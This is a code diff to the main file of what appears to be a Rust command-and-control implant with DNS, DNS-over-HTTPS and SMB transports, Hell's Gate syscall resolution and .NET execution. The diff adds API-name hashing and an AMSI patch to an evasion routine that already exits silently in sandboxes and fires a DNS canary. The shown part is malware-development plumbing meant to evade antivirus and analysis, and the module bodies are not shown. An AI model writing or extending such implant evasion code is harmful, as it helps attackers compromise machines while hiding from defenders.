@@ -9,6 +9,7 @@ mod transport_dns;
 mod transport_doh;
 mod transport_smb;
 mod hells_gate;
+mod api_hash;
 mod commands;
 mod evasion;
 mod dotnet;
@@ -38,9 +39,11 @@ fn sleep_ms() -> u64 {
 fn main() {
     // Resolve Nt* SSNs from ntdll before any evasion or sleep calls.
     hells_gate::init();
+    api_hash::init();
 
     // Evasion: exit silently if running in a sandbox, then fire DNS canary
     evasion::sandbox_check();
+    evasion::patch_amsi();
     if !config::CANARY_DOMAIN.is_empty() {
         evasion::dns_canary_check(config::CANARY_DOMAIN);
     }
